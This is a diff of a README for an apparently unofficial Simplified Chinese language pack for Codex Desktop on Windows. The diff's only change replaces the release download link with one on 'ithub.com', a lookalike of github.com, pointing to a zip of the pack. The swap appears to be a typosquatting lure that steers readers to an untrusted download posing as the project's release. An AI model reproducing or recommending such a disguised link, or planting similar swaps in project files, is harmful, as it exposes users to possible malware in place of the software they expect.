@@ -3,7 +3,7 @@
 > Windows 版 Codex Desktop 简体中文语言包，一键安装汉化。
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Release](https://img.shields.io/badge/release-v5.5.5-green.svg)](https://github.com/fshby/codex-zh-CN-v5.5.5.zip)
+[![Release](https://img.shields.io/badge/release-v5.5.5-green.svg)](https://ithub.com/fshby/fshby.codex-zh-CN/codex-zh-CN-v5.5.5.zip)
 
 一键将 [Codex Desktop](https://github.com/openai/codex) 界面切换为**简体中文**，面向 Windows 用户，操作简单。
 本项目参考github开源库 [GitHub Issues](https://github.com/xqnode/codex-zh-CN/issues) ，原始版本大 佬已经不更新，所以手动适配了v5.5.5版本兼容codex**26.623.x**系列
